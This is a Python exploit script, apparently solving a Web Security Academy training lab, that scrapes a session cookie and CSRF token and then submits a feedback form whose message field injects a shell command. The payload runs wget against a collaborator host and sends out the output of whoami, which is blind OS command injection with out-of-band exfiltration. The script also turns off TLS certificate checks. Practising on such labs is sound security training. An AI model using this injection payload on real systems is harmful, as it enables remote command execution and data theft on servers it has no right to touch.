import http.client
import http.client
import re
import ssl
import urllib.parse
import urllib.parse

LAB_ID = "???"
COLLABORATOR_URL = "???"

def GET_feedback(
) -> http.client.HTTPResponse:
    method, path = 'GET', '/feedback'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def POST_feedback_submit(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/feedback/submit'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'cookie': f'session={session}',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=0',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        ('name', 'greg'),
        ('email', 'greg@test.com'),
        ('subject', 'feedback'),
        ('message', f'" & wget {COLLABORATOR_URL}?x=`whoami` & "'),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def feedback_csrf() -> tuple[str, str]:
    response = GET_feedback()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return session, csrf


session, csrf = feedback_csrf()
response = POST_feedback_submit(session, csrf)
print(f"status: {response.status}")
for header, value in response.headers.items():
    print(f"{header}: {value}")
print(response.read().decode())
print()
